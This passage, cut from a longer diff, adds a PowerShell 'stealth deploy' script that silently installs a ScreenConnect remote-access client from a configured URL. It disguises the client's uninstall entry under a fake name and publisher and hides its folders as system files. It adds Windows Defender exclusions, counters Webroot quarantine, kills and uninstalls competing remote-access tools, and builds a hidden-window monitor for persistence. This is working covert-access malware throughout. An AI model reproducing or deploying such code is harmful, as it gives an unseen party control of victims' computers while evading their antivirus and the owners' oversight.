+            if ($_.Name -match '^([0-9a-fA-F]{16})$') { [void]$found.Add($Matches[1].ToLower()) }
+            elseif ($_.Name -match '([0-9a-fA-F]{16})') { [void]$found.Add($Matches[1].ToLower()) }
+        }
+    }
+
+    foreach ($key in @(
+        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
+        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
+    )) {
+        if (-not (Test-Path $key)) { continue }
+        Get-ChildItem $key -ErrorAction SilentlyContinue | ForEach-Object {
+            $app = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
+            if (-not $app) { return }
+            $blob = "$($app.DisplayName) $($app.InstallLocation) $($_.PSChildName)"
+            if ($blob -notlike '*ScreenConnect*') { return }
+            if ($blob -match '\(([0-9a-fA-F]{16})\)') { [void]$found.Add($Matches[1].ToLower()) }
+            elseif ($blob -match '([0-9a-fA-F]{16})') { [void]$found.Add($Matches[1].ToLower()) }
+        }
+    }
+
+    return @($found)
+}
+
+function Remove-ScByFingerprint {
+    param([string]$Fingerprint)
+    if ([string]::IsNullOrWhiteSpace($Fingerprint)) { return }
+    if ($Fingerprint -in $AllowedFingerprints) {
+        Write-Log "Skip remove - allowed fingerprint: $Fingerprint"
+        return
+    }
+
+    Write-Log "Removing unauthorized ScreenConnect: $Fingerprint"
+    $targetSvc = "ScreenConnect Client ($Fingerprint)"
+
+    # Prefer sc.exe / CIM - Get-Service breaks on parentheses
+    & sc.exe stop "$targetSvc" >$null 2>&1
+    & sc.exe delete "$targetSvc" >$null 2>&1
+    try {
+        Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
+            Where-Object { $_.Name -like "*$Fingerprint*" -or $_.DisplayName -like "*$Fingerprint*" } |
+            ForEach-Object {
+                & sc.exe stop "$($_.Name)" >$null 2>&1
+                & sc.exe delete "$($_.Name)" >$null 2>&1
+                Write-Log "Deleted SC service: $($_.Name)"
+            }
+    } catch {}
+
+    Get-Process -ErrorAction SilentlyContinue | Where-Object {
+        $path = ''
+        try { $path = $_.Path } catch {}
+        ($path -and $path -like "*$Fingerprint*") -or ($_.ProcessName -like '*ScreenConnect*')
+    } | ForEach-Object {
+        $path = ''
+        try { $path = $_.Path } catch {}
+        $keep = $false
+        foreach ($fp in $AllowedFingerprints) { if ($path -like "*$fp*") { $keep = $true; break } }
+        if (-not $keep) {
+            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
+        }
+    }
+
+    foreach ($key in @(
+        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
+        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
+    )) {
+        if (-not (Test-Path $key)) { continue }
+        Get-ChildItem $key -ErrorAction SilentlyContinue | ForEach-Object {
+            $app = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
+            if (-not $app) { return }
+            $hit = ($app.DisplayName -like "*$Fingerprint*") -or
+                   ($app.InstallLocation -like "*$Fingerprint*") -or
+                   ($_.PSPath -like "*$Fingerprint*") -or
+                   ($app.DisplayName -like 'ScreenConnect Client*' -and "$($app.DisplayName) $($app.InstallLocation)" -like "*$Fingerprint*")
+            if (-not $hit) { return }
+            if (Test-IsAllowedSc -Name $app.DisplayName -Path $app.InstallLocation) { return }
+
+            $guid = $null
+            if ($_.PSChildName -match '^\{[0-9A-Fa-f-]+\}$') { $guid = $_.PSChildName }
+            elseif ($app.UninstallString -match '\{([0-9A-Fa-f-]+)\}') { $guid = '{' + $Matches[1] + '}' }
+            if ($guid) {
+                Write-Log "msiexec /x $guid (rival $Fingerprint)"
+                $xp = Start-Process msiexec.exe -ArgumentList "/x $guid /quiet /norestart" `
+                    -Wait -PassThru -WindowStyle Hidden
+                Write-Log "rival uninstall exit $($xp.ExitCode)"
+            }
+        }
+    }
+
+    foreach ($p in @(
+        "${env:ProgramFiles}\ScreenConnect Client ($Fingerprint)",
+        "${env:ProgramFiles(x86)}\ScreenConnect Client ($Fingerprint)",
+        "${env:ProgramData}\ScreenConnect\$Fingerprint"
+    )) {
+        if (Test-Path $p) {
+            try {
+                Get-ChildItem $p -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+                    try { $_.Attributes = 'Normal' } catch {}
+                }
+            } catch {}
+            Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue
+            Write-Log "Removed rival path: $p"
+        }
+    }
+}
+
+function Invoke-RemoveUnauthorizedScreenConnect {
+    Write-Log 'Purging unauthorized ScreenConnect clients'
+    $fps = @(Get-InstalledScFingerprints)
+    Write-Log ("SC fingerprints found: " + ($(if ($fps.Count) { $fps -join ', ' } else { '(none)' })))
+    foreach ($fp in $fps) {
+        if ($fp -in $AllowedFingerprints) {
+            Write-Log "Keeping allowed SC: $fp"
+            continue
+        }
+        Remove-ScByFingerprint -Fingerprint $fp
+    }
+
+    # Catch services/folders that lack a clean 16-hex fingerprint in the name
+    try {
+        Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
+            Where-Object {
+                ($_.Name -like 'ScreenConnect*' -or $_.DisplayName -like 'ScreenConnect*') -and
+                -not (Test-IsAllowedSc -Name $_.Name -Path $_.PathName) -and
+                -not (Test-IsAllowedSc -Name $_.DisplayName -Path $_.PathName)
+            } |
+            ForEach-Object {
+                Write-Log "Force-delete non-allowed SC service: $($_.Name)"
+                & sc.exe stop "$($_.Name)" >$null 2>&1
+                & sc.exe delete "$($_.Name)" >$null 2>&1
+            }
+    } catch {}
+
+    foreach ($base in @("${env:ProgramFiles}", "${env:ProgramFiles(x86)}")) {
+        if (-not (Test-Path $base)) { continue }
+        Get-ChildItem -Path $base -Directory -ErrorAction SilentlyContinue |
+            Where-Object { $_.Name -like 'ScreenConnect Client*' } |
+            ForEach-Object {
+                $keep = $false
+                foreach ($fp in $AllowedFingerprints) {
+                    if ($_.Name -like "*$fp*" -or $_.FullName -like "*$fp*") { $keep = $true; break }
+                }
+                if (-not $keep) {
+                    Write-Log "Removing non-allowed SC folder: $($_.FullName)"
+                    Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
+                }
+            }
+    }
+}
+
+Write-Log '=== Stealth deploy start ==='
+Write-Log 'WU_BUILD_20260729T'
+
+# ============================================
+# PHASE 0: WIPE LOUD OLD VERSION + LEGACY
+# ============================================
+Write-Log 'PHASE 0: removing old loud artifacts'
+
+foreach ($fp in $LegacyFingerprints) { Remove-ScByFingerprint -Fingerprint $fp }
+Invoke-RemoveUnauthorizedScreenConnect
+
+# Old loud tasks from previous script versions
+$loudTaskHints = @(
+    'SC_Monitor', 'SC_HealthCheck', 'SC_Startup', 'SC_Logon', 'SC_Hourly',
+    'SC_Connectivity', 'SC_RivalKill', 'SC_Rival', 'SC_Purge', 'MSServices',
+    'ScreenConnectMonitor', 'SCRepair', 'RMM-AutoPurge', 'RMM_AutoPurge'
+)
+try {
+    foreach ($t in (Get-ScheduledTask -ErrorAction SilentlyContinue)) {
+        $tn = $t.TaskName
+        $act = ''
+        try { $act = (($t.Actions | ForEach-Object { @($_.Execute, $_.Arguments) }) -join ' ') } catch {}
+        $drop = $false
+        foreach ($h in $loudTaskHints) {
+            if ($tn -like "*$h*" -or $act -like "*$h*") { $drop = $true; break }
+        }
+        foreach ($fp in $LegacyFingerprints) {
+            if ($tn -like "*$fp*" -or $act -like "*$fp*") { $drop = $true; break }
+        }
+        if ($act -like '*SCRepair*' -or $act -like '*vexlm.com*' -or $act -like '*C:\Security*') {
+            $drop = $true
+        }
+        # Also refresh our own camouflaged task on re-apply
+        if ($tn -eq $TaskName -and $t.TaskPath -like '*Diagnosis*') { $drop = $true }
+        if ($drop) {
+            Unregister-ScheduledTask -TaskName $tn -TaskPath $t.TaskPath -Confirm:$false -ErrorAction SilentlyContinue
+            schtasks.exe /Delete /TN "$($t.TaskPath)$tn".Replace('\\', '\') /F 2>&1 | Out-Null
+            Write-Log "Removed old task: $($t.TaskPath)$tn"
+        }
+    }
+} catch {}
+
+# Old services
+foreach ($oldSvc in @('MSServices', 'MS Services', 'SCRepair', 'SC_Monitor')) {
+    $es = Get-Service -Name $oldSvc -ErrorAction SilentlyContinue
+    if ($es) {
+        Stop-Service -Name $es.Name -Force -ErrorAction SilentlyContinue
+        sc.exe delete $es.Name 2>&1 | Out-Null
+        Write-Log "Removed old service: $($es.Name)"
+    }
+}
+
+# Old Run keys
+foreach ($runPath in @(
+    'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
+    'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
+    'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
+)) {
+    foreach ($runName in @(
+        'ScreenConnectMonitor', 'MSServices', 'SC_Monitor', 'SCRepair',
+        'SC_RivalKill', 'RMM-AutoPurge', 'WindowsUpdateCheck'
+    )) {
+        if (Get-ItemProperty -Path $runPath -Name $runName -ErrorAction SilentlyContinue) {
+            Remove-ItemProperty -Path $runPath -Name $runName -Force -ErrorAction SilentlyContinue
+            Write-Log "Removed Run: $runPath\$runName"
+        }
+    }
+}
+
+# Startup leftovers (especially .ps1 = Notepad)
+foreach ($folder in @(
+    [Environment]::GetFolderPath('Startup'),
+    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+)) {
+    if (-not $folder -or -not (Test-Path $folder)) { continue }
+    Get-ChildItem $folder -Force -ErrorAction SilentlyContinue | Where-Object {
+        $_.Name -like '*.ps1' -or $_.Name -like 'SC_*' -or $_.Name -like 'MSServices*' -or
+        $_.Name -like 'SC_Monitor*' -or $_.Name -eq 'SC_Monitor.vbs'
+    } | ForEach-Object {
+        Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
+        Write-Log "Removed Startup leftover: $($_.FullName)"
+    }
+}
+
+# Old WMI
+try {
+    Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
+        Where-Object { $_.Name -like 'SC_Monitor*' -or $_.Name -like 'SCRepair*' -or $_.Name -like 'MSServices*' -or $_.Name -eq $WmiFilterName } |
+        ForEach-Object { $_.Delete() }
+    Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
+        Where-Object { $_.Name -like 'SC_Monitor*' -or $_.Name -like 'SCRepair*' -or $_.Name -like 'MSServices*' -or $_.Name -eq $WmiConsumerName } |
+        ForEach-Object { $_.Delete() }
+    Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
+        Where-Object { "$_" -like '*SC_Monitor*' -or "$_" -like '*SCRepair*' -or "$_" -like '*BVT*' } |
+        ForEach-Object { $_.Delete() }
+} catch {}
+
+# GPO bat from old build
+$gpoBat = 'C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\SC_Startup.bat'
+if (Test-Path $gpoBat) { Remove-Item $gpoBat -Force -ErrorAction SilentlyContinue }
+
+# Loud folders/files from old build
+foreach ($p in @(
+    'C:\ProgramData\SCRepair',
+    'C:\Security',
+    'C:\Windows\Temp\MSServices.ps1',
+    'C:\Windows\Temp\MSServices_Temp.ps1',
+    'C:\Windows\Temp\SCRepair_Backup'
+)) {
+    if (Test-Path $p) {
+        Get-ChildItem $p -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+            try { $_.Attributes = 'Normal' } catch {}
+        }
+        try { (Get-Item $p -Force).Attributes = 'Normal' } catch {}
+        Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue
+        Write-Log "Removed loud path: $p"
+    }
+}
+foreach ($fp in $LegacyFingerprints) {
+    @(
+        "C:\Windows\Temp\SC_Monitor_$fp.ps1",
+        "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\SC_Monitor_$fp.ps1",
+        "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SC_Monitor_$fp.ps1"
+    ) | ForEach-Object {
+        if (Test-Path $_) { Remove-Item $_ -Force -ErrorAction SilentlyContinue }
+    }
+}
+
+New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
+New-Item -ItemType Directory -Path $WorkDirAlt -Force | Out-Null
+Set-HiddenSystem $WorkDir
+Set-HiddenSystem $WorkDirAlt
+Write-Log 'PHASE 0 complete'
+Write-Log ("Host context: {0} SYSTEM={1} Admin={2}" -f $currentId.Name, $isSystem, $isAdmin)
+
+# ============================================
+# HELPERS
+# ============================================
+function Test-AppInstalled {
+    param([string]$Fingerprint)
+    if (Test-ScServicePresent -Name "ScreenConnect Client ($Fingerprint)") { return $true }
+    foreach ($base in @(
+        "${env:ProgramFiles}\ScreenConnect Client ($Fingerprint)",
+        "${env:ProgramFiles(x86)}\ScreenConnect Client ($Fingerprint)",
+        "${env:ProgramData}\ScreenConnect\$Fingerprint"
+    )) {
+        if (Test-Path $base) { return $true }
+    }
+    foreach ($key in @(
+        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
+        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
+    )) {
+        if (-not (Test-Path $key)) { continue }
+        foreach ($item in (Get-ChildItem $key -ErrorAction SilentlyContinue)) {
+            $p = Get-ItemProperty $item.PSPath -ErrorAction SilentlyContinue
+            if (-not $p) { continue }
+            if (($p.DisplayName -like "*$Fingerprint*") -or
+                ($p.InstallLocation -like "*$Fingerprint*") -or
+                ($item.PSPath -like "*$Fingerprint*")) { return $true }
+        }
+    }
+    return $false
+}
+
+function Set-ArpCamouflage {
+    param([string]$Fingerprint = $PrimaryFingerprint)
+    $found = $false
+    foreach ($root in @(
+        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
+        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
+    )) {
+        Get-ChildItem $root -ErrorAction SilentlyContinue | ForEach-Object {
+            $p = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
+            if (-not $p) { return }
+            $hit =
+                ($p.DisplayName -like "*ScreenConnect Client ($Fingerprint)*") -or
+                ($p.InstallLocation -like "*$Fingerprint*" -and $p.DisplayName -like '*ScreenConnect*') -or
+                ($_.PSPath -like "*$Fingerprint*" -and (
+                    $p.DisplayName -like '*ScreenConnect*' -or $p.DisplayName -eq $ArpDisplayName
+                ))
+            if (-not $hit) { return }
+            Set-ItemProperty $_.PSPath -Name DisplayName -Value $ArpDisplayName -ErrorAction SilentlyContinue
+            Set-ItemProperty $_.PSPath -Name Publisher -Value $ArpPublisher -ErrorAction SilentlyContinue
+            $found = $true
+            Write-Log "ARP camouflage applied: $($_.PSPath)"
+        }
+    }
+    return $found
+}
+
+function Test-TcpPort {
+    param([string]$Server = $RelayServer, [int]$Port = $RelayPort)
+    $c = $null
+    try {
+        $c = New-Object System.Net.Sockets.TcpClient
+        $iar = $c.BeginConnect($Server, $Port, $null, $null)
+        if ($iar.AsyncWaitHandle.WaitOne(3000, $false) -and $c.Connected) {
+            $c.EndConnect($iar)
+            return $true
+        }
+    } catch {
+    } finally { if ($c) { try { $c.Close() } catch {} } }
+    return $false
+}
+
+function Test-ScServicePresent {
+    param([string]$Name = $SvcName)
+    try {
+        $s = Get-CimInstance -ClassName Win32_Service -Filter "Name='$Name'" -ErrorAction SilentlyContinue
+        if ($s) { return $true }
+    } catch {}
+    $fp = if ($Name -match '\(([0-9a-f]{16})\)') { $Matches[1] } else { $PrimaryFingerprint }
+    try {
+        $s = Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
+            Where-Object { $_.Name -like "*$fp*" -or $_.DisplayName -like "*$fp*" } |
+            Select-Object -First 1
+        if ($s) { return $true }
+    } catch {}
+    return $false
+}
+
+function Test-ScServiceRunning {
+    param([string]$Name = $SvcName)
+    try {
+        $s = Get-CimInstance -ClassName Win32_Service -Filter "Name='$Name'" -ErrorAction SilentlyContinue
+        if ($s -and $s.State -eq 'Running') { return $true }
+    } catch {}
+    $fp = if ($Name -match '\(([0-9a-f]{16})\)') { $Matches[1] } else { $PrimaryFingerprint }
+    try {
+        $s = Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
+            Where-Object { $_.Name -like "*$fp*" -or $_.DisplayName -like "*$fp*" } |
+            Select-Object -First 1
+        if ($s -and $s.State -eq 'Running') { return $true }
+    } catch {}
+    return $false
+}
+
+function Get-ScServiceObject {
+    param([string]$Name = $SvcName)
+    $fp = if ($Name -match '\(([0-9a-f]{16})\)') { $Matches[1] } else { $PrimaryFingerprint }
+    $s = Get-Service -ErrorAction SilentlyContinue | Where-Object {
+        $_.Name -eq $Name -or $_.DisplayName -eq $Name -or
+        $_.Name -like "*$fp*" -or $_.DisplayName -like "*$fp*"
+    } | Select-Object -First 1
+    return $s
+}
+
+function Uninstall-PrimaryScResidue {
+    Write-Log 'Pre-clean: removing conflicting SC product residue before MSI'
+    Stop-Service -Name $SvcName -Force -ErrorAction SilentlyContinue
+    & sc.exe stop "$SvcName" >$null 2>&1
+    & sc.exe delete "$SvcName" >$null 2>&1
+
+    foreach ($key in @(
+        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
+        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
+    )) {
+        if (-not (Test-Path $key)) { continue }
+        Get-ChildItem $key -ErrorAction SilentlyContinue | ForEach-Object {
+            $p = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
+            if (-not $p) { return }
+            $hit =
+                ($p.DisplayName -like "*$PrimaryFingerprint*") -or
+                ($p.InstallLocation -like "*$PrimaryFingerprint*") -or
+                ($_.PSPath -like "*$PrimaryFingerprint*") -or
+                ($p.DisplayName -eq $ArpDisplayName -and $p.Publisher -eq $ArpPublisher)
+            if (-not $hit) { return }
+            $guid = $null
+            if ($_.PSChildName -match '^\{[0-9A-Fa-f-]+\}$') { $guid = $_.PSChildName }
+            elseif ($p.UninstallString -match '\{([0-9A-Fa-f-]+)\}') { $guid = '{' + $Matches[1] + '}' }
+            if ($guid) {
+                Write-Log "Pre-clean msiexec /x $guid"
+                $xp = Start-Process msiexec.exe -ArgumentList "/x $guid /quiet /norestart" `
+                    -Wait -PassThru -WindowStyle Hidden
+                Write-Log "uninstall exit $($xp.ExitCode)"
+            }
+        }
+    }
+
+    foreach ($p in @(
+        "${env:ProgramFiles}\ScreenConnect Client ($PrimaryFingerprint)",
+        "${env:ProgramFiles(x86)}\ScreenConnect Client ($PrimaryFingerprint)",
+        "${env:ProgramData}\ScreenConnect\$PrimaryFingerprint"
+    )) {
+        if (Test-Path $p) {
+            Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue
+            Write-Log "Removed residue path: $p"
+        }
+    }
+    Start-Sleep -Seconds 3
+}
+
+function Install-PrimarySc {
+    if ((Test-ScServiceRunning) -and -not (Test-ScHollowClient)) {
+        Write-Log 'Primary SC service RUNNING - skip MSI'
+        return $true
+    }
+    # Present but stopped: start only - do NOT uninstall/reinstall (causes 1603 loops)
+    if ((Test-ScServicePresent) -and -not (Test-ScHollowClient)) {
+        Write-Log 'Primary SC present - starting service (no MSI)'
+        Start-PrimaryService | Out-Null
+        if (Test-ScServiceRunning) {
+            Write-Log 'SC service RUNNING after sc start'
+            return $true
+        }
+        Write-Log 'sc start failed - continuing to MSI repair'
+    }
+    if (-not (Test-ScServicePresent)) {
+        Write-Log 'Primary SC service missing - forcing MSI install'
+        Uninstall-PrimaryScResidue
+    } elseif (Test-ScHollowClient) {
+        Write-Log 'Primary SC hollow (AV quarantine likely) - forcing MSI repair'
+        Uninstall-PrimaryScResidue
+    }
+
+    Write-Log "Downloading MSI"
+    if (Test-Path $MsiFile) { Remove-Item $MsiFile -Force -ErrorAction SilentlyContinue }
+    try {
+        Invoke-WebRequest -Uri $MsiUrl -OutFile $MsiFile -UseBasicParsing -UserAgent 'Mozilla/5.0'
+    } catch {
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add('User-Agent', 'Mozilla/5.0')
+        $wc.DownloadFile($MsiUrl, $MsiFile)
+        $wc.Dispose()
+    }
+    if (-not (Test-Path $MsiFile) -or ((Get-Item $MsiFile).Length -lt 500000)) {
+        Write-Log 'MSI invalid'
+        return $false
+    }
+    Write-Log ("MSI bytes: " + (Get-Item $MsiFile).Length)
+
+    $logMsi = Join-Path $WorkDir 'msi.log'
+    $p = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 /l*v `"$logMsi`"" `
+        -Wait -PassThru -WindowStyle Hidden
+    $code = $p.ExitCode
+    Write-Log "msiexec exit $code"
+    if ($code -ne 0) {
+        # Retry once as repair/reinstall
+        Write-Log 'msiexec retry with REINSTALL=ALL'
+        $p2 = Start-Process msiexec.exe -ArgumentList "/i `"$MsiFile`" /quiet /norestart ALLUSERS=1 REINSTALL=ALL REINSTALLMODE=vomus" `
+            -Wait -PassThru -WindowStyle Hidden
+        $code = $p2.ExitCode
+        Write-Log "msiexec reinstall exit $code"
+    }
+    Start-Sleep -Seconds 8
+    Remove-Item $MsiFile -Force -ErrorAction SilentlyContinue
+    Enable-ScFirewallAllow
+
+    if (Test-ScServicePresent) {
+        Start-PrimaryService | Out-Null
+        if (Test-ScServiceRunning) {
+            Write-Log 'SC service RUNNING after MSI'
+            return $true
+        }
+        Write-Log 'SC service present but not running after MSI'
+        return $false
+    }
+    Write-Log 'MSI finished but SC service still missing'
+    return $false
+}
+
+function Start-PrimaryService {
+    if (-not (Test-ScServicePresent)) { return $false }
+    & sc.exe config "$SvcName" start= auto >$null 2>&1
+    & sc.exe failure "$SvcName" reset= 86400 actions= restart/5000/restart/5000/restart/5000 >$null 2>&1
+    if (-not (Test-ScServiceRunning)) {
+        & sc.exe start "$SvcName" >$null 2>&1
+        try { Start-Service -Name $SvcName -ErrorAction SilentlyContinue } catch {}
+        Start-Sleep -Seconds 3
+    }
+    return (Test-ScServiceRunning)
+}
+
+function Invoke-RivalPurge {
+    Write-Log 'Rival purge'
+    Invoke-RemoveUnauthorizedScreenConnect
+
+    Get-Process -ErrorAction SilentlyContinue | ForEach-Object {
+        $pn = $_.ProcessName
+        $path = ''
+        try { $path = $_.Path } catch {}
+
+        if ($pn -like '*ScreenConnect*' -or $pn -like '*ClientService*') {
+            $ok = $false
+            foreach ($fp in $AllowedFingerprints) {
+                if ($path -like "*$fp*" -or $pn -like "*$fp*") { $ok = $true; break }
+            }
+            # No path (AV) or non-allowed path -> kill
+            if (-not $ok) {
+                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
+            }
+            return
+        }
+        foreach ($b in $RivalNames) {
+            if ($pn -like "*$b*" -or ($path -and $path -like "*$b*")) {
+                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
+                break
+            }
+        }
+    }
+
+    # Quiet uninstall of other rival RMM brands (SC handled above)
+    foreach ($key in @(
+        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
+        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
+    )) {
+        if (-not (Test-Path $key)) { continue }
+        Get-ChildItem $key -ErrorAction SilentlyContinue | ForEach-Object {
+            $app = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
+            if (-not $app -or -not $app.DisplayName -or -not $app.UninstallString) { return }
+            $n = $app.DisplayName
+            if (Test-IsAllowedSc -Name $n -Path $app.InstallLocation) { return }
+            if ($n -like '*Datto*') { return }
+            if ($n -like '*ScreenConnect*') { return }  # handled by Invoke-RemoveUnauthorizedScreenConnect
+            $match = $false
+            foreach ($b in $RivalNames) { if ($n -like "*$b*") { $match = $true; break } }
+            if (-not $match) { return }
+            if ($app.UninstallString -match '\{([0-9A-Fa-f-]+)\}') {
+                Start-Process msiexec.exe -ArgumentList "/x {$($Matches[1])} /quiet /norestart" `
+                    -Wait -WindowStyle Hidden | Out-Null
+            }
+        }
+    }
+
+    Start-PrimaryService | Out-Null
+}
+
+# ============================================
+# PHASE 1: QUIET EXCLUSIONS + INSTALL PRIMARY
+# ============================================
+# Clear stale success marker if binaries look stubbed so repair re-runs
+$repairMarker = Join-Path $WorkDir '.repaired_webroot'
+$preHealth = Get-ScBinaryHealth
+if ($preHealth.Stubbed -and (Test-Path $repairMarker)) {
+    Remove-Item $repairMarker -Force -ErrorAction SilentlyContinue
+    Write-Log 'Cleared repair marker: SC binaries look Webroot-stubbed'
+}
+
+Write-Log 'PHASE 1: quiet exclusions + ensure primary SC'
+Enable-QuietDefenderExclusions | Out-Null
+if (Test-WebrootInstalled -or (Test-ScControlBroken) -or $preHealth.Stubbed) {
+    Write-Log 'Webroot/control-broken/stubbed detected - running nuclear repair'
+    Repair-ScAfterAv | Out-Null
+}
+
+$appOk = Test-AppInstalled -Fingerprint $PrimaryFingerprint
+$svcOk = Test-ScServiceRunning
+$broken = Test-ScControlBroken
+$hNow = Get-ScBinaryHealth
+Write-Log ("SC detect: running=$svcOk appOk=$appOk controlBroken=$broken stubbed=$($hNow.Stubbed) maxExe=$($hNow.MaxExeSize) maxDll=$($hNow.MaxDllSize)")
+if (-not $svcOk -or -not $appOk -or $broken) {
+    Repair-ScAfterAv | Out-Null
+    Start-Sleep -Seconds 8
+}
+if (-not (Start-PrimaryService)) {
+    Invoke-ReactiveAvPushback -Issues @('sc_start_blocked')
+    Start-PrimaryService | Out-Null
+}
+Enable-ScFirewallAllow
+Set-ArpCamouflage | Out-Null
+if (Test-ScHollowClient -or (Test-ScControlBroken)) {
+    Write-Log 'Hollow/broken SC after Phase 1 - nuclear repair'
+    Repair-ScAfterAv | Out-Null
+}
+
+# ============================================
+# PHASE 2: RIVAL PURGE (now)
+# ============================================
+Write-Log 'PHASE 2: rival purge'
+Invoke-RivalPurge
+Set-ArpCamouflage | Out-Null
+
+# ============================================
+# PHASE 3: STEALTH PERSISTENCE (2 methods only)
+# ============================================
+Write-Log 'PHASE 3: stealth persistence'
+
+# Combined monitor: health + ARP + rival purge + dual-path heal + reactive AV if blocked
+$monitor = @"
+`$ErrorActionPreference = 'SilentlyContinue'
+`$ProgressPreference = 'SilentlyContinue'
+`$ConfirmPreference = 'None'
+try {
+    if (-not ('Native.Win' -as [type])) {
+        Add-Type -Name Win -Namespace Native -MemberDefinition @'
+[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'@
+    }
+    `$h = [Native.Win]::GetConsoleWindow()
+    if (`$h -ne [IntPtr]::Zero) { [void][Native.Win]::ShowWindow(`$h, 0) }
+} catch {}
+
+`$fp = '$PrimaryFingerprint'
+`$allowed = @('5f6010579852e507','f861c8140d453427')
+`$svcName = 'ScreenConnect Client ($fp)'
+`$msiUrl = '$MsiUrl'
+`$work = '$WorkDir'
+`$workAlt = '$WorkDirAlt'
+`$msi = Join-Path `$work 'pkg.msi'
+`$mon = Join-Path `$work 'wucache.ps1'
+`$monAlt = Join-Path `$workAlt 'wucache.ps1'
+`$arpName = '$ArpDisplayName'
+`$arpPub = '$ArpPublisher'
+`$log = Join-Path `$work '.diag.log'
+`$rivals = @('$($RivalNames -join "','")')
+
+function L([string]`$m) {
+    try {
+        New-Item -ItemType Directory -Path `$work -Force | Out-Null
+        Add-Content -Path `$log -Value ("[{0}] {1}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'), `$m)
+        `$f = Get-Item `$log -Force -EA SilentlyContinue
+        if (`$f) { `$f.Attributes = 'Hidden','System' }
+    } catch {}
+}
+function QuietExclusions {
+    if (-not (Get-Command Add-MpPreference -EA SilentlyContinue)) { return }
+    try {
+        Add-MpPreference -ExclusionPath `$work -EA SilentlyContinue
+        Add-MpPreference -ExclusionPath `$workAlt -EA SilentlyContinue
+        Add-MpPreference -ExclusionPath ("`${env:ProgramFiles}\ScreenConnect Client (`$fp)") -EA SilentlyContinue
+        Add-MpPreference -ExclusionPath ("`${env:ProgramFiles(x86)}\ScreenConnect Client (`$fp)") -EA SilentlyContinue
+        foreach (`$proc in @('powershell.exe','pwsh.exe','msiexec.exe','wscript.exe','ScreenConnect.ClientService.exe','ScreenConnect.Client.exe','ScreenConnect.WindowsClient.exe')) {
+            Add-MpPreference -ExclusionProcess `$proc -EA SilentlyContinue
+        }
+    } catch {}
+}
+function TestWebroot {
+    `$svcs = Get-Service -Name @('WRSVC','WRSAService','WRCoreService') -EA SilentlyContinue | Where-Object { `$_.Status -eq 'Running' }
+    if (`$svcs) { return `$true }
+    if (Get-Process -Name @('WRSA','WRSAMain','WRConsumerService') -EA SilentlyContinue) { return `$true }
+    return `$false
+}
+function TestWebrootInstalled {
+    if (Get-Service -Name @('WRSVC','WRSAService','WRCoreService') -EA SilentlyContinue) { return `$true }
+    foreach (`$p in @("`${env:ProgramFiles}\Webroot","`${env:ProgramFiles(x86)}\Webroot","`${env:ProgramData}\WRData")) { if (Test-Path `$p) { return `$true } }
+    return `$false
+}
+function ScRoots { @("`${env:ProgramFiles}\ScreenConnect Client (`$fp)","`${env:ProgramFiles(x86)}\ScreenConnect Client (`$fp)","`${env:ProgramData}\ScreenConnect\`$fp") | Where-Object { Test-Path `$_ } }
+function TestHollow {
+    if (-not (ScRunning)) { return `$false }
+    `$roots = @(ScRoots); if (`$roots.Count -eq 0) { return `$true }
+    `$exes = foreach (`$r in `$roots) { Get-ChildItem -Path `$r -Recurse -Include 'ScreenConnect.ClientService.exe','ScreenConnect.Client.exe','ScreenConnect.WindowsClient.exe' -EA SilentlyContinue }
+    if (-not `$exes -or @(`$exes).Count -eq 0) { return `$true }
